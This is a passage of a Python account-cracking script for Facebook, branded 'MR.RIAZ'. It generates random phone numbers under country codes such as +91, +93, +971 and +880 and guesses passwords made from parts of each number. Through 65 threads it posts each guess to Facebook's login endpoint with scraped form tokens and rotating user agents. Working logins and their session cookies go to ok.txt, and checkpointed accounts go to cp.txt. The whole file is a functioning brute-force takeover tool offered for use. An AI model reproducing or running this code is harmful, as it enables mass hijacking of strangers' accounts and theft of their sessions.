		print('[+]═══════════════════════════════════════════')
		for guru in uid:
			uid = '+91'+kode+guru
			aj = uid[0:6]
			aja = uid[0:8]
			pwx = [guru,kode+guru,aj,aja]
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	 
	facebookweb()
#_____
def random_number8():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :AFG USE YOUR SIME CODE +9')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════')
		for guru in uid:
			uid = '+93'+kode+guru
			aj = uid[0:6]
			aja = uid[0:8]
			pwx = [guru,kode+guru,aj,aja]
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	 
	facebookweb()
#_______
def random_number9():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :UIA USE YOUR SIMR CODE +971')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════') 
		for guru in uid:
			uid = '+971'+kode+guru
			aj = uid[0:6]
			aja = uid[0:8]
			pwx = [guru,kode+guru,aj,aja]
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	 
	facebookweb()
#___
def random_number7():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :BANGLA USE YOUR SIM CODE +88')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════')
		for guru in uid:
			uid = '+880'+kode+guru
			pwx = [guru,kode+guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	 
	facebookweb()
def rcrack(uid,pwx,tl):
	#print(uid)
	global loop
	global cps
	global oks
	try:
		for ps in pwx:
			ua = random.choice(ugen)
			ua2 = random.choice(ugen2)   
			session = requests.Session()
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {
			'authority': 'm.facebook.com',
			'method': 'GET',
			'path': '/login/device-based/login/async/',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'referer': 'https://m.facebook.com',
			'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'user-agent': ua}
			lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\033[1;92m[RIAZ-OK] '+uid+' | '+ps+'\033[0;97m')
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				cek_apk(session,coki)
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\x1b[38;5;208m[RIAZ-CP] '+uid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r\033[1;97m[MR.RIAZ]  [%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
random_crack()
